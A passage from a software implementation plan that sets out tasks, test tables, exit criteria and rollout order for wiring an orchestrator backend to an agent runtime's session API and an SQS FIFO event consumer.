| `it sends the create payload with exactly the contract fields` | a full spec | the request body deep-equals the expected object. **Pin the key set** — an extra or renamed key is silently dropped by the runtime, which is the failure `runtimeDispatch.test.js:29-30` guarded against on the old shape |
| `it returns SessionID, Status, WorkspacePath and Branch from a 201` | test server returning `201` | all four surfaced. **`201`, not `202`** (§A.2.1) |
| `it requests /v1/sdlc/sessions from a base carrying neither the prefix nor a port` | base `https://sherpa.example.com` | the path is `/v1/sdlc/sessions` **exactly once**, and the URL carries no port. **Both halves**: a base with the prefix produces `/v1/sdlc/v1/sdlc/sessions`, and a base with `:8443` dials a listener that does not exist and times out |
| `it marks a 403 non-retryable and says the credential was rejected` | `403` | `Retryable == false`, and the message distinguishes a rejected credential from a session-predicate `404`. **The two need different remedies and arrive as different statuses — keep them legible** |
| `it returns a typed error carrying the status on a 400` | `400 {"error":"..."}` | `Status == 400`, `Retryable == false`, and the message contains the body |
| `it returns the session record from GetSession, discarding messages` | `200 {session:{...}, messages:[...]}` | the `session` object only |
| `it returns a 404-typed error from GetSession for a missing session` | `404` | `Status == 404`. Part 2's stall handling branches on exactly this |
| `it tolerates a 200 that is a tombstone rather than a session` | `200 {"status":"unshared","tombstone":{...}}` | no panic, and a distinguishable error. **A `200` does not guarantee `.session` is present** (§A.2.5) |
| `it marks a 5xx retryable so the caller does not fail a cycle` | `503` | `Status == 503`, `Retryable == true`. **Assert the flag** — §A.2.5's rule is that `5xx` never fails a cycle, and the client is where that distinction is made |
| `it treats a repeated release as success` | `200` then `200` | both succeed — the consumer retries, and §A.2.4's idempotency requirement lives here too |
| `it retries a failed release once, then returns the error` | `500` then `200` succeeds; `500` twice returns an error | two attempts, **not three** |
| `it reads no environment variables` | — | the package source contains no `os.Getenv`. Config arrives as a struct from the handler (`internal/config` is the established place) |

**Acceptance:** `cd backend/go && go test ./internal/runtimeclient/...` passes. `grep -c "os.Getenv" internal/runtimeclient/*.go` returns 0.

**Commit:** `feat: add the runtime session client with bearer-token authentication`

**⚠ One known residue in this package, recorded so it is not cited as evidence.** The docblocks on `transport.go` and `secrets.go` still carry the **false** framing that mTLS *"needs a private CA and a leaf generated and uploaded by hand … and that step never happened."* **It is wrong for the reason §0.9.1 sets out at length** — the manual step was a property of our Terraform, not of mTLS, and both alternatives were declined on **cost**. The corrected rationale lives in `infrastructure/sherpa-sdlc-ingress.tf` and in the runtime's `sdlc/auth-token.ts`. **Fix these two comments; do not quote them.**

### Task 2.7 — real instruction and message composition

**Files:**
- `backend/common/sdlcInstructions.js` (NEW)
- `backend/__tests__/sdlcInstructions.test.js` (NEW)
- `backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` (MOD — replace Task 0.2's `renderPlanAsPrompt` placeholder)

**Why this is one module and not two.** Architecture doc **R6**: during the transition `AgentBootstrap` feeds both the Bedrock system blocks and the `instructions` field, and divergence between them is a silent quality regression. **One composition function, two consumers.** Put it in `backend/common/` so both the orchestrator and (later) the collapsed `engineeringAgent/orchestratorHandler.js` call the same code.

Implements §A.6. Exports two functions:

```js
buildInstructions({ role, applicationId, kbBucket, application, task })  // -> the full system prompt string
buildTaskMessage({ kind, cycle, ... })                                  // -> the first/next user message
```

`buildInstructions` assembles, in order: `new AgentBootstrap(kbBucket, role).assemble()` (`backend/common/agentBootstrap.js`), `loadEngineeringDocumentation()` (currently `engineeringAgent/orchestratorHandler.js:1149-1194` — **move it to `backend/common/` or call it through a parameter**; the consumer Lambda cannot require it where it is), `retrieveRelevantContext(task, applicationId)` (`backend/common/knowledgeBaseLoader.js`), per-app context, and the role's output contract ("call `reportCompletion` when done").

`buildTaskMessage` covers the four kinds in §A.6's table. **Only `engineering-start` (plan approved) is needed in Phase 2**; the other three are Part 2's. Define the discriminant now so Part 2 adds arms rather than reshaping.

**What drops out of `buildEngineeringPrompt`.** It is 182 lines (`orchestratorHandler.js:550-731`). The parts that exist only to fit a whole codebase into a 200K window go: the token budgeting at `:559-585` and everything downstream of `loadApplicationCodebase` (`:1224-1369`), because **the agent now reads the repo itself**. The parts that state what to build stay. Do not port the budgeting "just in case" — it is dead weight that will confuse the next reader about whether the agent has the codebase in context.

**Tests first.** `backend/__tests__/sdlcInstructions.test.js`. Mock `AgentBootstrap`, `loadEngineeringDocumentation` and `retrieveRelevantContext` — this is a composition test, not an integration test.

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it('assembles the bootstrap, documentation and RAG context in that order')` | doubles returning distinguishable markers | the output contains all three markers, and their indices are increasing. **Order matters for prompt caching** — `generatePlan` places a `cachePoint` after the system block (`orchestratorHandler.js:328`), so a reordering silently invalidates the cache |
| `it('states the role output contract naming the terminal tool')` | `role: 'engineer'` | the output mentions `reportCompletion` |
| `it('names exactly one terminal tool per role — submitPlan, reportCompletion, submitReview')` | each of the three roles | the correct tool named and **the other two not named**. An engineer prompt mentioning `submitPlan` invites a tool call the allowlist will reject |
| `it('states the payload shape in the plan and qa instructions')` | `role: 'plan'`, then `'qa'` | the output names every top-level key `validateCompletionPayload` will require for that stage. **This is now the only place the schema is stated to the model** (§A.5.2), so a missing key here is a guaranteed malformed payload — the assertion must be generated from the same constant the validator uses, not hand-written, or the two drift |
| `it('does not embed the application codebase')` | a large application fixture | output length is bounded; no file contents present. Guards against `loadApplicationCodebase` creeping back |
| `it('degrades rather than throwing when the knowledge base is unavailable')` | `retrieveRelevantContext` rejects | returns instructions without the RAG section. A KB outage must not fail a cycle |
| `it('builds the plan-approved message from the persisted plan, not the raw task')` | `cycle.expandedRequirements` with `summary`, `approach`, `requirements[]`; `cycle.task` a one-liner | the message contains `summary`, `approach` and every requirement title; **`cycle.task` alone is not the message.** This is Task 0.2's B2 bug, pinned properly |
| `it('names the approving actor in the plan-approved message')` | `approvedBy: 'jeff'` | present in the output |
| `it('falls back to the task when there is no plan')` | `expandedRequirements: null` | the message is the task |

**Acceptance:** `cd backend && npx jest __tests__/sdlcInstructions.test.js` passes, and `runtimeDispatch.test.js` still passes with the placeholder replaced.

**Commit:** `feat: compose SDLC session instructions and task messages`

### Task 2.8 — make the orchestrator's runtime branch real, with idempotency guards

**Files:**
- `backend/lambda_handlers/agentDrivenOrchestrator/index.js` (MOD — the branch at `:1628-1651`)
- `backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` (MOD)
- `backend/__tests__/runtimeDispatch.test.js` (MOD)

The branch at `index.js:1628-1651` currently calls the stubbed `createRuntimeSession`, persists `runtimeSessionId`/`runtimeSessionStubbed` with `updateItem`, logs, and **returns early without dispatching to SQS** — a runtime cycle "intentionally parks after starting its session" (`:1643-1645`). Replace the stub with the real client and add the guard.

**The idempotency guard, and why it is not optional.** `createRuntimeSession` followed by `updateItem` (`index.js:1629-1640`) is **two operations**, and this code path runs under an SQS trigger that retries. A retry landing after the session was created but before its id was persisted starts a **second session on the same branch — two agents, one branch, both pushing.**

**Note what does and does not save you here.** The runtime will happily create the second session: it provisions independent clones, so there is no branch collision and no `409` (§A.2.1). **Nothing on the runtime side prevents this; the guard is the only control.** An earlier draft cited the (unreachable) `409` as a backstop, which made this guard look like belt-and-braces. It is not — it is the whole belt.

Guard it the way PR creation already guards itself at `index.js:1858`:

```js
if (cycle.engineeringSessionId) return;   // already dispatched; the retry is a duplicate
```

**and persist the id with a `ConditionExpression` asserting it is still absent**, so the guard holds under genuine concurrency rather than only under sequential retry. The pattern is `processPlanGeneration`'s (`index.js:1260`, `:1282`: `'attribute_exists(PK) AND #status <> :cancelled'`).

**Note the field name.** Part 2 §1.4 establishes that the cycle record has **no per-step session id** today — only `runtimeSessionId`/`runtimeSessionStubbed` (`index.js:1637-1638`) — and Part 2 Task 4.1 adds `planSessionId`/`engineeringSessionId`/`qaSessionId`. **Phase 2 should use `runtimeSessionId` and not pre-empt that.** Write the guard against whatever field this phase persists, and leave a comment pointing at Part 2 Task 4.1. Adding three fields here, ahead of the code that reads them, is how a half-migration starts.

**Drop `runtimeSessionStubbed`** in the same change — the stub is gone, and a field that is always `false` is a field the next reader has to investigate.

**Tests first.** `runtimeDispatch.test.js`'s `describe('orchestrator wiring')` block (`:104-132`) reads `index.js` as source because the module is not directly requireable. Extend it — and add real unit tests for the guard logic by extracting it into a testable function if it is not already one.

| Test name (sentence) | Assertion |
|---|---|
| `it('calls the real runtime client, not the stub')` | source does **not** contain `stub-`; does contain `require('../../common/runtimeClient')` or the re-export |
| `it('guards against a duplicate dispatch on SQS retry')` | source contains a check on the persisted session id before creating |
| `it('persists the session id with a ConditionExpression asserting it was absent')` | source contains `attribute_not_exists` near the session-id write. **A source assertion is weaker than a behavioural one** — if you can extract the write into a testable helper, do, and test it properly instead |
| `it('asserts both runtimeSessionId and engineeringSessionId are absent')` | the `ConditionExpression` names **both** fields | **This is a forward-compatibility guard and it is not optional.** Part 2 Task 4.1 adds per-step session ids and Task 4.2's condition asserts `attribute_not_exists(engineeringSessionId)`. Cycles created in Phases 2–3 carry `runtimeSessionId` and **not** `engineeringSessionId`, so after the Phase 4 deploy an SQS retry on one of those in-flight cycles **passes the new condition and starts a second session on the same branch**. Writing the condition against both fields from the start closes a window that would otherwise open silently at a deploy boundary (review §4(j)) |
| `it('no longer persists runtimeSessionStubbed')` | source does not contain `runtimeSessionStubbed` |
| `it('keeps the SQS dispatch as the default for non-runtime applications')` | existing test at `:127-131`, unchanged |

Behavioural tests for the guard, in a new `backend/__tests__/runtimeDispatchGuard.test.js` if extraction is feasible:

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('does not create a second session when one is already recorded')` | cycle with a session id | the client's `createSession` was not called |
| `it('treats a ConditionalCheckFailedException on the id write as an already-dispatched duplicate')` | write throws it | resolves without error; **the created session is released**, not orphaned. That last clause matters: losing the race means you created a session nobody will ever consume |

**Acceptance:** `cd backend && npx jest __tests__/runtimeDispatch.test.js __tests__/runtimeDispatchGuard.test.js` passes. `grep -n "stub-" backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` returns nothing.

**Commit:** `feat: dispatch real runtime sessions from the engineering branch`

### Task 2.9 — the end-to-end proof, with throwaway polling

**Files:**
- `scripts/testing/sdlc-session-smoke.js` (NEW — a throwaway script, not a test; `scripts/testing/` already holds `test-ssm-agentic.js` and `test-ssm-tools.js`, so the convention exists)

**Not TDD.** This is the phase's exit criterion and it is an integration proof against live infrastructure. Do not dress it up as a unit test.

The script:

1. Mints an M2M token (reuse `backend/common/runtimeClient.js`).
2. `POST /runtime/sessions` with `mode: 'do'`, a **throwaway repo**, a trivial task ("add a file `HELLO.md` containing the word hello, then call reportCompletion"), the engineer profile, and a `correlation` with a fake `applicationId`/`cycleId`.
3. Polls `GET /runtime/sessions/{id}` every 10 s, printing `status` and `filesModified`, until `status` is `completed`, `paused` or the script times out at 15 minutes.
4. Prints the final record and exits non-zero unless `status === 'completed'` **and** `commitSha` is set.
5. `DELETE /runtime/sessions/{id}`, twice, asserting both succeed.

**Use a throwaway repo, and say which one in the script header.** The GitHub App installation covers real customer repositories and **any session on the runtime can push to any of them** (§A.7.4). A smoke test that commits to a real repo is how that becomes an incident.

**Acceptance — the phase exit criterion:**
```
node scripts/testing/sdlc-session-smoke.js
```
Expected final output: `status: completed`, a non-empty `commitSha`, `filesModified` containing `HELLO.md`, and the commit visible on the throwaway repo's branch on GitHub. Exit code 0.

**Commit:** `chore: add SDLC session smoke script`

### Phase 2 exit criteria

1. `npm run test:backend` passes, including `runtimeClient.test.js`, `sdlcInstructions.test.js` and the extended `runtimeDispatch.test.js`.
2. `pnpm build && pnpm --filter @nevado/runtime test` passes in `nevado-sherpa-tui`, including the new ACL and profile tests.
3. **`node scripts/testing/sdlc-session-smoke.js` exits 0** — CC starts a `do` session, the agent commits and pushes, CC sees `status: 'completed'` with a `commitSha`, and the commit is on GitHub.
4. **ACL, live, and this is the criterion that matters:** a **human-created** session (one created through `/v1/workspace/sessions`, i.e. with no `application` or with `'web'`) returns **`404`** on `GET /runtime/sessions/{id}`, on cancel, and on `DELETE`. **And `DELETE` on it does not destroy its workspace** — a `404` that still tore down a human's clone would be worse than a `200`. Verified against testing, not only in unit tests.
   - **Per-client isolation is explicitly NOT a criterion, and revision 6 hardens why.** The ACL is `application === 'sdlc'` only (§A.3). `createdBy` is **forced to a constant and cannot be set**, and one shared bearer token carries no per-caller signal — so this is not a v1 limitation awaiting a v2 predicate, it is **a property of the design**. ~~The second M2M client from Phase 1's N2…~~ — there is no second M2M client and N2 is deleted. **A second machine caller that must be told apart needs its own credential.**
5. **Supersede works under create-then-release:** create session A on branch `cycle/x`; create session B on the same branch **while A is still live** — it returns `201`, because the runtime provisions independent clones and there is no branch collision (§A.2.1); then `DELETE` A twice — **both succeed**, because release is idempotent; then `GET` A → `404`, and B is still running.
   - An earlier draft's criterion here was *"a new session on the same branch is `201`, not `409`"*, which **passes trivially and proves nothing**: the `409` it was testing for is unreachable. The criterion above tests the three things that are real — that create-then-release does not need a collision guard, that release is idempotent under consumer retry, and that releasing the superseded session does not disturb its replacement.
6. A session created through `/v1/sdlc` **does not appear** in the human session list, and cannot be resumed from a human surface.
7. **`application === 'sdlc'` survives to the persisted record**, asserted by Task 2.2's test against the store rather than the response body. This is the assertion the whole ACL rests on (§0.1.d(2)).
8. **Each session's provider advertises exactly one terminal tool and refuses every other name**, and a `profile.tools` naming zero or two is a `400` at create. ~~…and `PLAN_BLOCKED_TOOLS` excludes `reportCompletion` in plan mode, verified against the deployed 4.0.2 with the `getToolConfig` probe.~~ **Struck in revision 6:** `PLAN_BLOCKED_TOOLS` cannot see a tool reached through `useMcpTool`, and there is no 4.0.2 to probe. Verified by `terminal-tools.test.ts` (§A.5.4, Task 2.1).
9. **`resultSchema` enforces in-session, and is safely absent-tolerant** (§A.5.3). Three checks: a session created **with** a schema and a deliberately non-conforming payload gets a `toolError` naming the failing JSON Pointer path **and publishes nothing**; the agent's corrected retry then succeeds **in the same session**; and a session created **without** `resultSchema` forwards the same non-conforming payload unvalidated. The third is the kill switch, and it is the reason a validator is safe to ship behind an outage-gated release.
10. **A malformed `resultSchema` is a `400` at create**, not a silent fall back to unvalidated.
11. **A second terminal-tool call in one session is rejected in-session** (§A.5.4a), so exactly one envelope publishes. First-write-wins must be deliberate, not an artefact of the consumer's `ConditionExpression`.
12. ~~**The spec↔handler conformance test passes** (§A.8 P11a)…~~ **DELETED in revision 6 — not applicable.** The model never sees an `inputSchema` through `useMcpTool`, so there is no declared-schema/handler pair to bind (Task 2.1, §A.8). **The `saveLearnedPattern` / `updateTechDebt` drifts in the deployed 4.0.1 are real and stand as the evidence for §A.5.0 — they are SDK bugs and must not gate this phase.**
13. **The SDK is unchanged.** `pnpm-lock.yaml` still resolves `@nevadoai/sherpa-core` and `@nevadoai/sherpa-protocol` to **`4.0.1`**, and Command Center's `PINNED_SDK_VERSION` is still `'4.0.1'` with its drift guard passing untouched. **A change to either is the failure this criterion exists to catch**, because it turns a one-repo deploy into a three-repo release train (§A.8).

**Rollback.** The CC side is additive: the runtime branch is gated on `agentConfig.buildMode === 'runtime'` (`index.js:1628`), which no production application sets, so nothing changes for any existing cycle. The runtime side adds a prefix and routes without touching `/v1/workspace/*`; rollback is a pinned-SHA redeploy (`AWS_DEPLOYMENT.md:664-681`).

~~**The one irreversible thing in this phase is the 4.0.2 SDK release.**~~ **Struck in revision 6 — there is no release, so nothing in this phase is irreversible in that sense.** What replaces it is not irreversibility but cost: **every runtime-side change needs a manual SSM deploy that kills every in-flight session, human included.** A bad `reportCompletion` is reverted by deploying a pinned earlier tarball — recoverable, but at the price of a second outage window. Get Task 2.1 right before publishing. **§0.1.d(1)'s collapse still had to be decided before Phase 2 rather than during it**, and the reason survives the change of repo: a `submitPlan` carrying CC's plan schema would have put a Command Center vocabulary change behind an outage window forever. It is now a description and a `resultSchema`, both of which CC owns.

### Phase 2 ordering and parallelism

```
2.0 — DELETED (SDK change declined on merit)

2.1 (runtime: 3 tools behind McpToolProvider + resultSchema validator) ──> 2.4 (ACL + profile)
                                                                            │
2.2 (create) ──> 2.2b (get + cancel) ──> 2.3 (commitSha/baseBranch) ──────> 2.5 (DELETE)
                                                                            │
2.6 (CC client) ──> 2.7 (instructions) ──> 2.8 (orchestrator branch) ─────> 2.9 (smoke)
```

- **There is no SDK release in this phase, so there is nothing to sequence around one.** **2.0 is deleted** (declined on merit — `sherpa-sdk` #226; Task 2.0, BQ3a) and **2.1 moved into the runtime** (BQ3). **Every task in this phase is a Command Center change or a runtime change, and the two are independent.**
- **2.1 gates 2.9** (the smoke test needs a terminal tool). ~~It gates 2.4's allowlist half.~~ **Struck:** there is no allowlist filter to ship — 4.0.1's `buildToolConfig` cannot express one (§A.5.4), and the terminal-tool half of §A.7.3 is enforced by 2.1's provider plus the create-time `400`, both of which are inside 2.1.
- **2.2 → 2.2b → 2.3 is the runtime route sequence.** 2.2b is small and can go in parallel with 2.3 once create exists; both must precede 2.9.
- **2.5 (DELETE) can start any time** — it touches a different handler — but it is easier to test once create works, and exit criterion 5 needs both.
- **2.6, 2.7, 2.8 are Command Center and can run fully in parallel with 2.0–2.5**, coding against Section A. That is what Section A is for.
- **2.9 needs everything.**
- **Each runtime-side merge needs a manual SSM deploy** (§0.3). Batch them: **one** deploy after 2.1 + 2.2 + 2.2b + 2.3 + 2.4 + 2.5, rather than six. **No version bump rides it** — `pnpm-lock.yaml` still resolves `@nevadoai/sherpa-core` to `4.0.1`, and a bump appearing here means someone reintroduced the SDK dependency. Remember the all-zeros `/health` pre-flight — the deploy stops the service and `rm -rf`s `/opt/sherpa`, and `SIGTERM` does not drain agent sessions.
- **Phase 0 and Part 2's Phase 4b continue in parallel throughout.**

**A note on what Phase 2's runtime deploy buys Part 2.** Because all three tools plus the generic `resultSchema` validator ship here (Task 2.1) and none of them carries an SDLC schema, **Part 2 Phases 5 and 6 need no runtime deploy at all — and never needed an SDK release** — a plan or review schema change is a `backend/common/sdlcContract.js` edit on CC's normal pipeline. That is the payoff, and it is worth protecting: if a later task wants one more field on a plan or review payload, the answer is a CC-side change to `PLAN_PAYLOAD_CONTRACT`, **never** a sixth outage window.

## Phase 3 — the SQS FIFO event transport

**Blocked on Phase 2 passing all seven exit criteria, and on Part 2's Phase 4b being merged** (see the hard gate below).

**Goal:** delete the polling scaffolding from Phase 2. The runtime publishes session events to an SQS FIFO queue; a short-lived consumer Lambda maps them through `runtimeEvents.mapSessionEvent`, writes cycle state, and exits. **No invocation ever spans a session**, so the 15-minute Lambda cap stops being an architectural constraint.

### 3.0 What already exists — build on it, do not rebuild it

Two of the three pieces the architecture doc describes as work **already landed on `develop`** and are covered by tests. Read them before writing anything.

| Piece | Where | State |
|---|---|---|
| `mapSessionEvent` — pure event→effect mapping | `backend/lambda_handlers/agentDrivenOrchestrator/runtimeEvents.js:47-101` | Landed in #763 (`546408af`, "Map runtime session events to cycle state (consumer half)"). Correct against the real protocol. Returns the effects vocabulary `activity` / `cycleField` / `status` / `complete`. |
| `buildCompletionEffect` — the no-`reportCompletion` fallback | `runtimeEvents.js:113-133` | Landed. Its `success: false` arm (`:114-122`) is the right behaviour for a session that ends without calling the tool. **Keep it.** |
| `applyRuntimeEffect` — executes the effects | `agentDrivenOrchestrator/index.js:140-168`, exported at `:4982` | Landed. Dispatches on effect kind; `complete` hands off to `routeAfterEngineering` (`:155-163`). |
| Tests | `backend/__tests__/runtimeEvents.test.js` (122 lines), `backend/__tests__/applyRuntimeEffect.test.js` (115 lines) | Both green. `applyRuntimeEffect.test.js` is **the harness to copy for the consumer's tests** (§0.2) — `jest.isolateModules`, a `{send}` stub on `DynamoDBDocumentClient.from`, `jest.spyOn` on `dynamoHelpers.updateItem` and `progressLogger.addProgressLog`, and `trackCommandArgs()` to recover payloads from auto-mocked SDK command constructors. Do not rebuild it. |

**What is genuinely missing:** the envelope and its validation, the `completion` effect arm, per-stage dispatch, idempotency, the extraction into `backend/common/`, the consumer Lambda, all of the Terraform, and the entire publisher.

**Hard gate — Part 2's Phase 4b must merge before Task 3.2.** `applyTransition` **throws** on a status it does not know: `sdlcEngine.js:511-513` is `if (!(toStatus in TRANSITIONS)) { throw new Error(\`Unknown target status "${toStatus}"\`) }`, and `ENGINEERING_FAILED` is not a key of `TRANSITIONS` (verified: the table at `sdlcEngine.js:48-228` has 23 keys and that is not one of them). So the per-stage `error` mapping in Task 3.2 cannot write `ENGINEERING_FAILED` until 4b adds it — it would not degrade, it would throw inside the consumer and poison the message. This is Part 2's `DEP-P1-6` and its §3.2 hard-gate row, and it is correct. **Do not stub the constant as a workaround**: a constant that exists in `cycleStatuses.js` but has no `TRANSITIONS` entry, no `cycleStatusConfig.js` entry and no `ATTENTION_STATUSES` membership is a half-migration, which is the failure class Part 2 §1.1 and architecture doc Phase 4b both warn about. Either 4b is merged or Task 3.2 ships with the engineering arm mapping to `FAILED` exactly as it does today and a follow-up commit flips it.

### Task 3.1 — the contract module and shared fixtures

**Files:**
- `backend/common/sdlcContract.js` (NEW)
- `backend/__tests__/fixtures/sdlcEvents.js` (NEW — establishes a fixtures directory; there is no fixtures convention today)
- `backend/__tests__/sdlcContract.test.js` (NEW)

**Why this module exists.** The Command Center backend cannot import `@nevadoai/sherpa-protocol` — it is an ESM package and a **frontend-only** dependency (`frontend/package.json:26-28`); `backend/package.json` has no `@nevadoai/*` dependency at all, and adding one would pull it into the shared Lambda Layer that ~20 functions attach to (§0.0, and `backend/common/sherpaSessions.js:21-27` for the full reasoning). So the envelope contract is **restated in plain CommonJS with a drift guard**, exactly as `sherpaSessions.js` restates the S3 key rules.

Exports:

```js
module.exports = {
  ENVELOPE_VERSION,          // 1
  SDLC_STAGES,               // ['planning', 'engineering', 'qa']
  COMPLETION_KIND_FOR_STAGE, // { planning: 'plan', engineering: 'engineering', qa: 'review' }
  validateEnvelope,          // (obj) -> { ok: true, envelope } | { ok: false, reason }
  validateCompletionPayload, // (stage, payload) -> { ok: true } | { ok: false, reason }
  cycleKeyFromCorrelation,   // (correlation) -> { pk, sk }
};
```

`validateEnvelope` is the consumer's front door and must be **total** — it never throws, it returns a reason. It checks, in order: the value is an object; `v === 1` (an unknown `v` is its own distinct reason, because §A.4.1 requires the consumer to *fail* the message rather than ignore it); `sessionId` is a non-empty string; **`dedupId` is a non-empty string** (`seq`, if present, is ignored — it is non-durable and not the dedup key, §A.4.1); `publishedAt` parses as a date; `correlation` has a non-empty `applicationId`, a non-empty `cycleId` and a `stage` in `SDLC_STAGES`; `events` is an array of length `>= 1`.

**This is where the `stage`-value check lives, and it is the only place it lives.** The runtime does not validate `stage` (§A.2.1's courier rule), so a stage CC has not taught the consumer about arrives here and is rejected with a named reason. That is the right trade: a new stage is a Command Center deploy, and until the consumer knows what to do with it, failing the message loudly to the DLQ is better than guessing.

`validateCompletionPayload(stage, payload)` **runs `PLAN_PAYLOAD_CONTRACT.schema` / `QA_PAYLOAD_CONTRACT.schema` from §A.8a — the same object `createSession` ships as `resultSchema` and the same object `buildInstructions` describes in prose.** One literal, three consumers, no copies to drift. It additionally applies the cross-field rules JSON Schema cannot state (`verdict: 'fail'` requires non-empty `findings`; `technicalApproach` must be *rejected*, not merely unrequired) and the DynamoDB budget check (§A.4.3). Part 1 builds the function and its `engineering` arm (which is a no-op — that payload is typed on the wire); **Part 2 Phase 5 supplies the plan schema and Phase 6 the review schema.** Leave each as an explicit `{ok: false, reason: 'plan payload schema not implemented — Part 2 Phase 5'}` rather than a permissive default, so a plan completion arriving before Phase 5 fails loudly to the DLQ instead of being written as `expandedRequirements: undefined`.

**The contract object is the single source shared by all three consumers** (§A.8a). Task 2.7's test asserts `buildInstructions` names every key the validator requires; §A.9's `it('ships the same schema to the runtime that the consumer validates against')` asserts the create request and the consumer use the same object. **If the prompt, the in-session schema and the consumer's validator can disagree, they will** — that is exactly how `saveLearnedPattern` came to reject payloads that obey its own declared schema (§A.5.0a).

`cycleKeyFromCorrelation` returns `{ pk: \`APP#${applicationId}\`, sk: cycleId }`. **Verified against the real record:** `index.js:1069-1070` is `PK: \`APP#${applicationId}\``, `SK: cycleId`. This one function is why the consumer needs no DynamoDB read and no session→cycle lookup table. **`cycleId` arrives with its `CYCLE#` prefix already on it** — it is the sort key verbatim. If a publisher ever sends the bare id, the consumer writes to the wrong key silently, which is why the tests below pin it.

**Tests first.** `backend/__tests__/sdlcContract.test.js`. Header must state what the module is a port of and that `sdlcContract` is the CC-side mirror of the runtime's `apps/runtime/src/sdlc/contract.ts` — **not of anything in the protocol package, which carries none of these types** (§A.1, §A.8).

| Test name (sentence) | Fixture | Assertion |
|---|---|---|
| `it('accepts a well-formed Tier 2 envelope')` | `ENVELOPE_TIER2` | `ok: true` |
| `it('rejects an envelope with an unknown version so the consumer fails the message rather than ignoring it')` | `ENVELOPE_UNKNOWN_V` (`v: 2`) | `ok: false`, and `reason` **names the version** — the consumer logs it, and "unknown envelope version 2" is the only log line that tells an operator the two repos have drifted |
| `it('rejects an envelope with no events — an empty window publishes nothing')` | `ENVELOPE_EMPTY_EVENTS` | `ok: false`. §A.4.4: an empty Tier 2 window must publish nothing at all, so `events: []` is a publisher bug |
| `it('rejects an envelope with no dedupId')` | omit `dedupId`; then `dedupId: ''` | `ok: false` for both. It is the `MessageDeduplicationId`, so an envelope without one cannot have been published correctly |
| `it('ignores an unknown top-level field such as a legacy seq')` | `seq: 0`; `seq: '1'`; any other unexpected key | `ok: true` for all three. **There is no `seq` field (§A.4.1)**, and unknown fields are ignored rather than rejected in both directions (§A) — which is what lets the two repos deploy independently. An earlier draft required it to be a positive integer, which would have made a restart's reset counter a poison message |
| `it('rejects a stage the consumer does not know how to handle')` | `stage: 'deploy-fix'` | `ok: false` with a reason naming the stage. The runtime accepts it (§A.2.1); the consumer is where it stops |
| `it('reports an unimplemented payload schema as a failure, not a pass')` | `validateCompletionPayload('planning', {})` before Phase 5 | `ok: false` with a reason naming the phase. **A permissive default here writes `expandedRequirements: undefined` and the cycle looks fine until a human opens the plan dialog** |
| `it('rejects a correlation missing applicationId, cycleId or stage')` | three variants | `ok: false` for each, with a reason naming the missing field |
| `it('rejects a stage outside planning, engineering, qa')` | `stage: 'deploy'` | `ok: false` |
| `it('never throws on malformed input')` | `null`, `undefined`, `42`, `'string'`, `[]`, `{}` | `ok: false` for all six, no throw. The consumer's front door cannot be a source of exceptions |
| `it('derives the cycle key with the APP# partition prefix and the cycleId verbatim')` | `{applicationId: 'app_1', cycleId: 'CYCLE#2026-09-23T14:00:00.000Z'}` | `{pk: 'APP#app_1', sk: 'CYCLE#2026-09-23T14:00:00.000Z'}`. **Pin the exact strings** — this is the one function whose silent failure writes a phantom cycle record |
| `it('maps each stage to a distinct completion kind')` | — | `COMPLETION_KIND_FOR_STAGE` is `{planning:'plan', engineering:'engineering', qa:'review'}`, has exactly three keys, and **its three values are distinct.** Assert distinctness explicitly: an earlier revision collapsed `planning` and `qa` onto one kind, which made the cross-check vacuous for exactly the two stages that need it (§A.4.3) |

Add to `backend/__tests__/sherpaSdkDriftGuard.test.js` (68 lines) one assertion in its existing style:

| Test name (sentence) | Assertion |
|---|---|
| `it('keeps the SDLC envelope contract in the shared module, not inlined in the consumer')` | `backend/lambda_handlers/sdlcEventConsumer/index.js` contains `require('common/sdlcContract')` (or `../../common/sdlcContract`) and does **not** contain a literal `'APP#'`. Mirrors the existing test at `:57-67`, and guards the same failure: a copy of the rules in a handler that the drift guard does not point at |

**The fixtures file** is the deliverable that matters most beyond this task. `backend/__tests__/fixtures/sdlcEvents.js` exports the full set named in §A.9. **It is used by both the mapper tests and the consumer tests** so a shape change fails in one place rather than drifting between two suites. Freeze each fixture with `Object.freeze` at export so a test that mutates one cannot corrupt another — the suites run in one process.

**Acceptance:**
- `cd backend && npx jest __tests__/sdlcContract.test.js __tests__/sherpaSdkDriftGuard.test.js` passes.
- `grep -c "process.env" backend/common/sdlcContract.js` returns `0` (project rule: only handlers read env vars).

**Commit:** `feat: add the SDLC event envelope contract and shared fixtures`

### Task 3.2 — extend `mapSessionEvent` for stage, completion and per-stage failure

**Files:**
- `backend/lambda_handlers/agentDrivenOrchestrator/runtimeEvents.js` (MOD)
- `backend/__tests__/runtimeEvents.test.js` (MOD)

**Gated on Part 2 Phase 4b** for the engineering `error` arm only — see §3.0. Everything else in this task is unblocked.

Four changes to a module that is otherwise correct and stays pure. **Keeping it pure is the property that made it worth keeping**: the whole per-stage table below is unit-testable with no queue, no session and no deployed runtime.

**(a) `stage` comes from the envelope, not a hardcoded string.** Three sites: `runtimeEvents.js:56`, **`:67`** and `:75` (the architecture doc says `:56,68,75` — `:68` is the `message:` line, §0.1.a C8). Change the signature to `mapSessionEvent(event, { session, stage } = {})` and thread `stage` through. This is Part 2's `DEP-P1-5`.

**(b) A `completion` arm — `engineering` only.** This **removes the fetch-the-session round trip**: `buildCompletionEffect(session)` exists only because `commitSha`/`branch` are not in any event (`runtimeEvents.js:21-23` says so). Now they are, on `EngineeringCompletion`. **Keep `buildCompletionEffect` as the fallback** for a session that ends without calling the tool — its `success: false` arm (`:114-122`) already returns a usable message.

**`plan` and `review` are rejected here, not mapped.** An earlier revision had Phase 3 build all three arms. **Part 2 asked for engineering-only and it is right**, for an ownership reason: Part 2 owns the `planComplete` and `qaComplete` effect shapes (its Tasks 5.1 and 6.5), so Part 1 emitting them first would pin a contract Part 2 has not designed yet — and the two would then have to agree by correspondence. **Part 1's job is to make the gap loud, not to guess the shape.**

So: a `completion` whose `correlation.stage` is `planning` or `qa` produces an explicit **unsupported-stage failure** naming the stage and the phase that will support it. The consumer reports it as a batch item failure → DLQ → alarm (§A.4.6). That is the correct disposition: no plan or QA session exists in Phase 3, so one arriving means CC granted a tool for a step it is not running, and a redrive after Phase 5 or 6 lands replays it correctly.

